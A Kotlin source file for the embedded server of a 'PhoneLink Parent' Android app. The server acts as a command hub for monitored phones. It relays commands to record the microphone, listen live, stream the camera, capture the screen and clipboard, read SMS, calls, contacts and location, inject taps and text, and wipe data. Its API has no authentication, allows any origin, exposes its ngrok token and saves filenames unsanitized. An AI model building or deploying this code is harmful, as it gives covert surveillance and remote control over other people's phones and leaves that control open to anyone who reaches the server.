package com.phonelink.parent.server

import android.content.Context
import android.util.Log
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import com.google.gson.reflect.TypeToken
import android.media.MediaScannerConnection
import android.os.Environment
import com.phonelink.parent.license.LicenseManager
import com.phonelink.parent.tunnel.TunnelManager
import com.phonelink.parent.utils.NetworkUtils
import io.ktor.http.ContentType
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.serialization.gson.gson
import io.ktor.server.application.call
import io.ktor.server.application.install
import io.ktor.server.cio.CIO
import io.ktor.server.engine.ApplicationEngine
import io.ktor.server.engine.embeddedServer
import io.ktor.server.plugins.contentnegotiation.ContentNegotiation
import io.ktor.server.plugins.cors.routing.CORS
import io.ktor.server.request.receiveText
import io.ktor.server.response.respond
import io.ktor.server.response.respondBytes
import io.ktor.server.response.respondText
import io.ktor.server.routing.delete
import io.ktor.server.routing.get
import io.ktor.server.routing.post
import io.ktor.server.routing.routing
import io.ktor.server.websocket.WebSockets
import io.ktor.server.websocket.webSocket
import io.ktor.websocket.Frame
import io.ktor.websocket.WebSocketSession
import io.ktor.websocket.readText
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.channels.ClosedReceiveChannelException
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.InputStream
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CopyOnWriteArrayList

/**
 * Embedded Ktor Server running inside the Parent Android App.
 * Handles both HTTP (REST API + static React Dashboard assets) and WebSockets on port 5000.
 */
class EmbeddedHubServer(private val context: Context, private val port: Int = 5000) {

    companion object {
        val COMMAND_EVENTS = mapOf(
            "send-sms" to "SEND_SMS_COMMAND",
            "file-list" to "FILE_LIST_REQUEST",
            "file-download" to "FILE_DOWNLOAD_REQUEST",
            "file-upload" to "FILE_UPLOAD_CHUNK",
            "request-location" to "LOCATION_REQUEST",
            "request-calls" to "CALLS_REQUEST",
            "request-sms" to "SMS_REQUEST",
            "request-contacts" to "CONTACTS_REQUEST",
            "add-contact" to "ADD_CONTACT_COMMAND",
            "find-phone" to "FIND_PHONE_COMMAND",
            "find-phone-stop" to "FIND_PHONE_STOP_COMMAND",
            "notification-dismiss" to "NOTIFICATION_DISMISS_COMMAND",
            "notification-clear-all" to "NOTIFICATION_CLEAR_ALL_COMMAND",
            "vibrate" to "VIBRATE_COMMAND",
            "tts" to "TTS_COMMAND",
            "play-audio" to "PLAY_AUDIO_COMMAND",
            "play-audio-stop" to "PLAY_AUDIO_STOP",
            "wallpaper" to "WALLPAPER_COMMAND",
            "device-info" to "DEVICE_INFO_REQUEST",
            "installed-apps" to "INSTALLED_APPS_REQUEST",
            "app-perms" to "APP_PERMS_REQUEST",
            "wifi-info" to "WIFI_REQUEST",
            "clipboard-read" to "CLIPBOARD_READ_REQUEST",
            "clipboard-enable" to "CLIPBOARD_CAPTURE_ENABLE",
            "clipboard-disable" to "CLIPBOARD_CAPTURE_DISABLE",
            "lock" to "LOCK_COMMAND",
            "call-blocklist-sync" to "CALL_BLOCKLIST_SYNC",
            "mic-record" to "MIC_RECORD_COMMAND",
            "camera-capture" to "CAMERA_CAPTURE_COMMAND",
            "screenshot" to "SCREENSHOT_COMMAND",
            "screen-record-start" to "SCREEN_RECORD_START",
            "screen-record-stop" to "SCREEN_RECORD_STOP",
            "camera-stream-start" to "CAMERA_STREAM_START",
            "camera-stream-stop" to "CAMERA_STREAM_STOP",
            "torch" to "TORCH_COMMAND",
            "wipe-data" to "WIPE_COMMAND",
            "live-listen-start" to "LIVE_LISTEN_START",
            "live-listen-stop" to "LIVE_LISTEN_STOP",
            "input-key" to "INPUT_KEY_COMMAND",
            "input-tap" to "INPUT_TAP_COMMAND",
            "input-swipe" to "INPUT_SWIPE_COMMAND",
            "volume-get" to "VOLUME_GET_REQUEST",
            "volume-set" to "VOLUME_SET_COMMAND",
            "clipboard-write" to "CLIPBOARD_WRITE_COMMAND",
            "open-url" to "OPEN_URL_COMMAND",
            "battery-stats" to "BATTERY_STATS_REQUEST",
            "launch-app" to "LAUNCH_APP_COMMAND",
            "lost-mode" to "LOST_MODE_COMMAND",
            "media-gallery" to "MEDIA_GALLERY_REQUEST",
            "input-text" to "INPUT_TEXT_COMMAND",
            "screen-wake" to "SCREEN_WAKE_COMMAND",
            "call-action" to "CALL_ACTION_COMMAND",
            "cellular-info" to "CELLULAR_INFO_REQUEST",
            "torch-strobe" to "TORCH_STROBE_COMMAND",
            "junk-scan" to "JUNK_SCAN_REQUEST",
            "junk-clean" to "JUNK_CLEAN_COMMAND",
            "dnd-get" to "DND_GET_REQUEST",
            "dnd-set" to "DND_SET_COMMAND",
            "file-delete" to "FILE_DELETE_COMMAND",
            "file-rename" to "FILE_RENAME_COMMAND",
            "file-mkdir" to "FILE_MKDIR_COMMAND",
            "file-move" to "FILE_MOVE_COMMAND",
            "file-copy" to "FILE_COPY_COMMAND",
            "uninstall-app" to "UNINSTALL_APP_COMMAND",
            "call-outgoing" to "CALL_OUTGOING_COMMAND",
            "walkie-talkie-start" to "WALKIE_TALKIE_START",
            "walkie-talkie-chunk" to "WALKIE_TALKIE_CHUNK",
            "walkie-talkie-stop" to "WALKIE_TALKIE_STOP",
            "sync-config" to "SYNC_CONFIG_COMMAND",
            "parental-control" to "PARENTAL_CONTROL_CONFIG_COMMAND",
            "app-usage" to "APP_USAGE_REQUEST",
            "storage-analysis" to "STORAGE_ANALYSIS_REQUEST",
            "pause-monitoring" to "PAUSE_MONITORING_COMMAND",
            "delete-contact" to "DELETE_CONTACT_COMMAND",
            "edit-contact" to "EDIT_CONTACT_COMMAND",
            "delete-call" to "DELETE_CALL_COMMAND",
            "clear-calls" to "CLEAR_CALLS_COMMAND",
            "lock-screen-message" to "LOCK_SCREEN_MESSAGE_COMMAND"
        )
    }

    private val TAG = "EmbeddedHubServer"
    private var engine: ApplicationEngine? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val gson: Gson = GsonBuilder().setPrettyPrinting().create()

    // Active WebSocket connections
    // Key: deviceId, Value: Child phone WebSocketSession
    private val childSessions = ConcurrentHashMap<String, WebSocketSession>()
    // Set of Dashboard web clients
    private val dashboardSessions = CopyOnWriteArrayList<WebSocketSession>()

    // Memory Store & Cache
    private val devices = ConcurrentHashMap<String, MutableMap<String, Any?>>()
    private val calls = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val messages = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val locations = ConcurrentHashMap<String, MutableMap<String, Any?>>()
    private val contacts = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()
    private val notifications = ConcurrentHashMap<String, MutableList<Map<String, Any?>>>()

    private val dbFile = File(context.filesDir, "db.json")

    init {
        loadDatabase()
    }

    fun start() {
        if (engine != null) return
        try {
            engine = embeddedServer(CIO, port = port, host = "0.0.0.0") {
                install(WebSockets) {
                    maxFrameSize = Long.MAX_VALUE
                    masking = false
                }

                install(CORS) {
                    anyHost()
                    allowHeader(HttpHeaders.ContentType)
                    allowHeader(HttpHeaders.Authorization)
                }

                install(ContentNegotiation) {
                    gson()
                }

                routing {
                    // WebSocket Handler for both Root "/" and "/ws"
                    val wsHandler: suspend io.ktor.server.websocket.WebSocketServerSession.() -> Unit = {
                        handleWebSocketSession(this)
                    }
                    webSocket("/", handler = wsHandler)
                    webSocket("/ws", handler = wsHandler)

                    // ---------------- REST API Endpoints ----------------
                    get("/api/server-info") {
                        val ip = NetworkUtils.getLocalIpAddress(this@EmbeddedHubServer.context)
                        val info = mapOf(
                            "localIp" to ip,
                            "port" to port,
                            "localUrl" to "http://$ip:$port",
                            "connectedDevices" to childSessions.size,
                            "totalDevices" to devices.size
                        )
                        call.respond(info)
                    }

                    get("/api/devices") {
                        call.respond(devices.values.toList())
                    }

                    delete("/api/devices/{id}") {
                        val deviceId = call.parameters["id"]
                        if (deviceId != null) {
                            devices.remove(deviceId)
                            calls.remove(deviceId)
                            messages.remove(deviceId)
                            locations.remove(deviceId)
                            contacts.remove(deviceId)
                            notifications.remove(deviceId)
                            saveDatabase()
                            broadcastToDashboards(JSONObject().apply {
                                put("type", "device-removed")
                                put("deviceId", deviceId)
                            }.toString())
                            call.respond(mapOf("success" to true))
                        } else {
                            call.respond(HttpStatusCode.BadRequest, mapOf("error" to "Missing id"))
                        }
                    }

                    get("/api/devices/{id}/calls") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(calls[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/sms") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(messages[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/messages") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(messages[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/notifications") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(notifications[id] ?: emptyList<Any>())
                    }

                    get("/api/devices/{id}/location") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(locations[id] ?: emptyMap<String, Any>())
                    }

                    get("/api/devices/{id}/contacts") {
                        val id = call.parameters["id"] ?: ""
                        call.respond(contacts[id] ?: emptyList<Any>())
                    }

                    post("/api/command/{name}") {
                        val commandName = call.parameters["name"] ?: ""
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val deviceId = json.optString("deviceId", "")
                        if (deviceId.isEmpty()) {
                            call.respond(HttpStatusCode.BadRequest, mapOf("success" to false, "error" to "deviceId is required"))
                            return@post
                        }
                        val phoneEvent = COMMAND_EVENTS[commandName] ?: commandName
                        val childSession = childSessions[deviceId]
                        if (childSession != null) {
                            val forwardMsg = JSONObject().apply {
                                put("event", phoneEvent)
                                put("payload", json)
                            }
                            try {
                                childSession.send(Frame.Text(forwardMsg.toString()))
                                call.respond(mapOf("success" to true))
                            } catch (e: Exception) {
                                call.respond(HttpStatusCode.InternalServerError, mapOf("success" to false, "error" to (e.message ?: "Send error")))
                            }
                        } else {
                            call.respond(mapOf("success" to false, "error" to "Device is offline or not registered", "queued" to false))
                        }
                    }

                    // Commercial Licensing API with Secret God Mode Support
                    get("/api/license/status") {
                        call.respond(LicenseManager.getLicenseStatus(this@EmbeddedHubServer.context))
                    }

                    post("/api/license/activate") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val licenseKey = json.optString("licenseKey", "")
                        val result = LicenseManager.activateLicense(this@EmbeddedHubServer.context, licenseKey)
                        call.respond(result)
                    }

                    post("/api/license/logout") {
                        call.respond(LicenseManager.logout(this@EmbeddedHubServer.context))
                    }

                    // ---------------- Ngrok Embedded Tunneling Management API ----------------
                    get("/api/tunnel/status") {
                        call.respond(mapOf(
                            "isRunning" to TunnelManager.isTunnelRunning(),
                            "activeUrl" to TunnelManager.getActiveUrl(),
                            "authtoken" to TunnelManager.getNgrokToken(this@EmbeddedHubServer.context),
                            "domain" to TunnelManager.getNgrokDomain(this@EmbeddedHubServer.context),
                            "autoStart" to TunnelManager.isAutoStart(this@EmbeddedHubServer.context)
                        ))
                    }

                    post("/api/tunnel/start") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val token = json.optString("authtoken", "")
                        val domain = json.optString("domain", "")
                        val autoStart = json.optBoolean("autoStart", true)

                        if (token.isNotEmpty() || domain.isNotEmpty()) {
                            TunnelManager.saveConfig(this@EmbeddedHubServer.context, token, domain, autoStart)
                        }

                        TunnelManager.startTunnel(this@EmbeddedHubServer.context, port)
                        call.respond(mapOf(
                            "success" to true,
                            "isRunning" to true,
                            "activeUrl" to TunnelManager.getActiveUrl()
                        ))
                    }

                    post("/api/tunnel/stop") {
                        TunnelManager.stopTunnel(this@EmbeddedHubServer.context)
                        call.respond(mapOf("success" to true, "isRunning" to false))
                    }

                    // ---------------- Direct File Save to Internal Storage PhoneLink Folder ----------------
                    post("/api/downloads/save") {
                        val body = call.receiveText()
                        val json = try { JSONObject(body) } catch (_: Exception) { JSONObject() }
                        val filename = json.optString("filename", "file_${System.currentTimeMillis()}.bin")
                        val b64 = json.optString("data", "")
                        if (b64.isNotEmpty()) {
                            val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                            val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                            saveToPhoneLinkFolder(filename, bytes)
                            call.respond(mapOf("success" to true, "filename" to filename))
                        } else {
                            call.respond(mapOf("success" to false, "error" to "No data provided"))
                        }
                    }

                    // ---------------- Static React Dashboard Asset Serving ----------------
                    get("/{path...}") {
                        val requestedPath = call.parameters.getAll("path")?.joinToString("/") ?: ""
                        serveStaticAsset(call, requestedPath)
                    }
                }
            }

            engine?.start(wait = false)
            Log.i(TAG, "Embedded Hub Server started on 0.0.0.0:$port")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start Embedded Hub Server: ${e.message}", e)
        }
    }

    fun stop() {
        try {
            engine?.stop(1000, 2000)
            engine = null
            Log.i(TAG, "Embedded Hub Server stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping server: ${e.message}", e)
        }
    }

    fun getConnectedDeviceCount(): Int = childSessions.size

    private suspend fun handleWebSocketSession(session: WebSocketSession) {
        var registeredDeviceId: String? = null
        var isDashboard = true

        // Automatically register as dashboard listener initially
        if (!dashboardSessions.contains(session)) {
            dashboardSessions.add(session)
        }

        // Send all currently known devices as DEVICE_UPDATE events immediately
        for (dev in devices.values) {
            val devMsg = JSONObject().apply {
                put("event", "DEVICE_UPDATE")
                put("payload", JSONObject(gson.toJson(dev)))
            }
            try {
                session.send(Frame.Text(devMsg.toString()))
            } catch (_: Exception) {}
        }

        try {
            for (frame in session.incoming) {
                if (frame is Frame.Text) {
                    val text = frame.readText()
                    try {
                        val json = JSONObject(text)
                        val type = json.optString("type")
                        val event = json.optString("event")
                        val msgType = if (event.isNotEmpty()) event else type

                        when (msgType) {
                            "REGISTER_DEVICE", "DEVICE_REGISTER", "device-register" -> {
                                isDashboard = false
                                dashboardSessions.remove(session)

                                val payload = json.optJSONObject("payload") ?: json.optJSONObject("device") ?: json
                                val devId = payload.optString("deviceId")
                                if (devId.isNotEmpty()) {
                                    registeredDeviceId = devId
                                    childSessions[devId] = session

                                    val devMap = devices.getOrPut(devId) { mutableMapOf() }
                                    devMap["deviceId"] = devId
                                    devMap["id"] = devId
                                    devMap["deviceName"] = payload.optString("deviceName", payload.optString("name", "Android Phone"))
                                    devMap["battery"] = payload.optInt("battery", 100)
                                    devMap["isCharging"] = payload.optBoolean("isCharging", false)
                                    devMap["online"] = true
                                    devMap["last_seen"] = System.currentTimeMillis()
                                    if (payload.has("model")) devMap["model"] = payload.optString("model")
                                    if (payload.has("androidVersion")) devMap["androidVersion"] = payload.optString("androidVersion")
                                    if (payload.has("manufacturer")) devMap["manufacturer"] = payload.optString("manufacturer")

                                    saveDatabase()

                                    // Acknowledge registration to child phone
                                    session.send(Frame.Text(JSONObject().apply {
                                        put("event", "DEVICE_REGISTERED")
                                        put("payload", JSONObject().put("deviceId", devId).put("status", "ok"))
                                    }.toString()))

                                    // Broadcast DEVICE_UPDATE to all dashboards
                                    broadcastToDashboards(JSONObject().apply {
                                        put("event", "DEVICE_UPDATE")
                                        put("payload", JSONObject(gson.toJson(devMap)))
                                    }.toString())
                                    Log.i(TAG, "Child device registered: $devId (${devMap["deviceName"]})")
                                }
                            }

                            "HEARTBEAT", "DEVICE_HEARTBEAT", "DEVICE_STATUS", "telemetry-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val devMap = devices.getOrPut(devId) { mutableMapOf("deviceId" to devId, "id" to devId) }
                                    if (payload.has("battery")) devMap["battery"] = payload.optInt("battery")
                                    if (payload.has("isCharging")) devMap["isCharging"] = payload.optBoolean("isCharging")
                                    devMap["online"] = true
                                    devMap["last_seen"] = System.currentTimeMillis()
                                    saveDatabase()

                                    broadcastToDashboards(JSONObject().apply {
                                        put("event", "DEVICE_UPDATE")
                                        put("payload", JSONObject(gson.toJson(devMap)))
                                    }.toString())
                                }
                            }

                            "SYNC_CALLS", "calls-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val callList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        payload.optJSONArray("calls")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    calls[devId] = callList
                                    saveDatabase()

                                    val bcast = JSONObject().apply {
                                        put("event", "CALLS_SYNCED")
                                        put("payload", JSONObject().apply {
                                            put("deviceId", devId)
                                            put("calls", payload.optJSONArray("calls") ?: JSONArray())
                                        })
                                    }
                                    broadcastToDashboards(bcast.toString())
                                }
                            }

                            "SYNC_SMS", "sms-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val smsList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        payload.optJSONArray("messages")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    messages[devId] = smsList
                                    saveDatabase()

                                    val bcast = JSONObject().apply {
                                        put("event", "SMS_SYNCED")
                                        put("payload", JSONObject().apply {
                                            put("deviceId", devId)
                                            put("messages", payload.optJSONArray("messages") ?: JSONArray())
                                        })
                                    }
                                    broadcastToDashboards(bcast.toString())
                                }
                            }

                            "LOCATION_UPDATE", "LOCATION_REPORT", "location-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val locObj = payload.optJSONObject("location") ?: payload
                                    val locMap: MutableMap<String, Any?> = gson.fromJson(
                                        locObj.toString(),
                                        object : TypeToken<MutableMap<String, Any?>>() {}.type
                                    )
                                    locations[devId] = locMap
                                    saveDatabase()

                                    val bcast = JSONObject().apply {
                                        put("event", "LOCATION_UPDATE")
                                        put("payload", JSONObject().apply {
                                            put("deviceId", devId)
                                            put("latitude", locObj.optDouble("latitude", locObj.optDouble("lat", 0.0)))
                                            put("longitude", locObj.optDouble("longitude", locObj.optDouble("lng", 0.0)))
                                            put("accuracy", locObj.optDouble("accuracy", 0.0))
                                            put("timestamp", locObj.optLong("timestamp", System.currentTimeMillis()))
                                        })
                                    }
                                    broadcastToDashboards(bcast.toString())
                                }
                            }

                            "SYNC_CONTACTS", "contacts-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val contactList: MutableList<Map<String, Any?>> = gson.fromJson(
                                        payload.optJSONArray("contacts")?.toString() ?: "[]",
                                        object : TypeToken<MutableList<Map<String, Any?>>>() {}.type
                                    )
                                    contacts[devId] = contactList
                                    saveDatabase()

                                    val bcast = JSONObject().apply {
                                        put("event", "CONTACTS_SYNCED")
                                        put("payload", JSONObject().apply {
                                            put("deviceId", devId)
                                            put("contacts", payload.optJSONArray("contacts") ?: JSONArray())
                                        })
                                    }
                                    broadcastToDashboards(bcast.toString())
                                }
                            }

                            "NOTIFICATION_POSTED", "notifications-update" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val devId = payload.optString("deviceId", registeredDeviceId ?: "")
                                if (devId.isNotEmpty()) {
                                    val notifList = notifications.getOrPut(devId) { mutableListOf() }
                                    val notifMap: Map<String, Any?> = gson.fromJson(
                                        payload.toString(),
                                        object : TypeToken<Map<String, Any?>>() {}.type
                                    )
                                    notifList.add(0, notifMap)
                                    if (notifList.size > 100) notifList.removeAt(notifList.size - 1)
                                    saveDatabase()
                                }
                                broadcastToDashboards(text)
                            }

                            // Command sent from Dashboard to target Child Phone
                            "command" -> {
                                val targetDeviceId = json.optString("deviceId")
                                val childSocket = childSessions[targetDeviceId]
                                if (childSocket != null) {
                                    childSocket.send(Frame.Text(text))
                                } else {
                                    Log.w(TAG, "Target child device not online: $targetDeviceId")
                                }
                            }

                            // File Download Response from Child Phone -> Automatically save to internal storage PhoneLink folder
                            "FILE_DOWNLOAD_RESPONSE", "file-download-response" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val name = payload.optString("name", "download_${System.currentTimeMillis()}.bin")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        saveToPhoneLinkFolder(name, bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save downloaded file: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Mic Audio Recording Result from Child Phone -> Save to PhoneLink folder
                            "MIC_RECORD_RESULT", "mic-record-result" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val recId = payload.optString("recordingId", "${System.currentTimeMillis()}")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        val ext = if (payload.optString("mimeType").contains("mp4") || payload.optString("mimeType").contains("m4a")) "m4a" else "mp3"
                                        saveToPhoneLinkFolder("mic_record_${recId}.$ext", bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save mic recording: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Call Recording Saved -> Save to PhoneLink folder
                            "CALL_RECORDING_SAVED", "call-recording-saved" -> {
                                val payload = json.optJSONObject("payload") ?: json
                                val fname = payload.optString("filename", "call_${System.currentTimeMillis()}.m4a")
                                val b64 = payload.optString("data", "")
                                if (b64.isNotEmpty()) {
                                    try {
                                        val clean = if (b64.contains(",")) b64.substringAfter(",") else b64
                                        val bytes = android.util.Base64.decode(clean, android.util.Base64.DEFAULT)
                                        saveToPhoneLinkFolder(fname, bytes)
                                    } catch (e: Exception) {
                                        Log.w(TAG, "Failed to auto-save call recording: ${e.message}")
                                    }
                                }
                                broadcastToDashboards(text)
                            }

                            // Streaming Frames & Results: Forward directly to dashboard
                            "camera-frame", "screen-frame", "audio-chunk", "exec-result", "notification-alert",
                            "CAMERA_CAPTURE_RESULT", "SCREENSHOT_RESULT", "FILE_LIST_RESPONSE" -> {
                                broadcastToDashboards(text)
                            }

                            else -> {
                                // Default broadcast to dashboards
                                if (!isDashboard) {
                                    broadcastToDashboards(text)
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error handling message: ${e.message}", e)
                    }
                }
            }
        } catch (_: ClosedReceiveChannelException) {
        } catch (e: Exception) {
            Log.e(TAG, "WebSocket error: ${e.message}")
        } finally {
            if (isDashboard) {
                dashboardSessions.remove(session)
            }
            if (registeredDeviceId != null) {
                childSessions.remove(registeredDeviceId)
                devices[registeredDeviceId]?.let {
                    it["online"] = false
                    it["last_seen"] = System.currentTimeMillis()
                    saveDatabase()
                    broadcastToDashboards(JSONObject().apply {
                        put("event", "DEVICE_UPDATE")
                        put("payload", JSONObject(gson.toJson(it)))
                    }.toString())
                }
            }
        }
    }

    private fun broadcastToDashboards(text: String) {
        val frame = Frame.Text(text)
        scope.launch {
            for (dash in dashboardSessions) {
                try {
                    dash.send(frame)
                } catch (_: Exception) {
                    dashboardSessions.remove(dash)
                }
            }
        }
    }

    private suspend fun serveStaticAsset(call: io.ktor.server.application.ApplicationCall, requestedPath: String) {
        val assetPath = if (requestedPath.isBlank() || requestedPath == "/") {
            "dashboard/index.html"
        } else {
            "dashboard/$requestedPath"
        }

        var stream: InputStream? = null
        var contentType = getMimeType(assetPath)

        try {
            stream = context.assets.open(assetPath)
        } catch (_: Exception) {
            // SPA Fallback: If not found, serve dashboard/index.html
            try {
                stream = context.assets.open("dashboard/index.html")
                contentType = ContentType.Text.Html
            } catch (_: Exception) {}
        }

        if (stream != null) {
            val bytes = stream.use { it.readBytes() }
            call.respondBytes(bytes, contentType)
        } else {
            call.respondText("PhoneLink Parent Hub Asset Not Found", ContentType.Text.Plain, HttpStatusCode.NotFound)
        }
    }

    private fun getMimeType(path: String): ContentType {
        return when {
            path.endsWith(".html") -> ContentType.Text.Html
            path.endsWith(".js") -> ContentType.Application.JavaScript
            path.endsWith(".css") -> ContentType.Text.CSS
            path.endsWith(".svg") -> ContentType.parse("image/svg+xml")
            path.endsWith(".json") -> ContentType.Application.Json
            path.endsWith(".png") -> ContentType.parse("image/png")
            path.endsWith(".jpg") || path.endsWith(".jpeg") -> ContentType.parse("image/jpeg")
            path.endsWith(".ico") -> ContentType.parse("image/x-icon")
            path.endsWith(".woff2") -> ContentType.parse("font/woff2")
            path.endsWith(".woff") -> ContentType.parse("font/woff")
            path.endsWith(".ttf") -> ContentType.parse("font/ttf")
            else -> ContentType.Application.OctetStream
        }
    }

    private fun loadDatabase() {
        if (!dbFile.exists()) return
        try {
            val text = dbFile.readText()
            val json = JSONObject(text)
            
            if (json.has("devices")) {
                val list: List<Map<String, Any?>> = gson.fromJson(
                    json.getJSONArray("devices").toString(),
                    object : TypeToken<List<Map<String, Any?>>>() {}.type
                )
                list.forEach { dev ->
                    val id = dev["deviceId"]?.toString() ?: ""
                    if (id.isNotEmpty()) {
                        val m = dev.toMutableMap()
                        m["online"] = false // reset on server boot
                        devices[id] = m
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error loading database: ${e.message}")
        }
    }

    private fun saveDatabase() {
        scope.launch {
            try {
                val json = JSONObject().apply {
                    put("devices", JSONArray(gson.toJson(devices.values)))
                }
                dbFile.writeText(json.toString(2))
            } catch (e: Exception) {
                Log.e(TAG, "Error saving database: ${e.message}")
            }
        }
    }

    fun saveToPhoneLinkFolder(filename: String, dataBytes: ByteArray) {
        try {
            val phoneLinkDir = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "PhoneLink")
            if (!phoneLinkDir.exists()) {
                phoneLinkDir.mkdirs()
            }
            val target = File(phoneLinkDir, filename)
            target.writeBytes(dataBytes)
            MediaScannerConnection.scanFile(context, arrayOf(target.absolutePath), null, null)
            Log.i(TAG, "📁 Saved file to PhoneLink folder: ${target.absolutePath} (${dataBytes.size} bytes)")
        } catch (e: Exception) {
            Log.w(TAG, "Failed saving file to PhoneLink folder: ${e.message}")
        }
    }
}

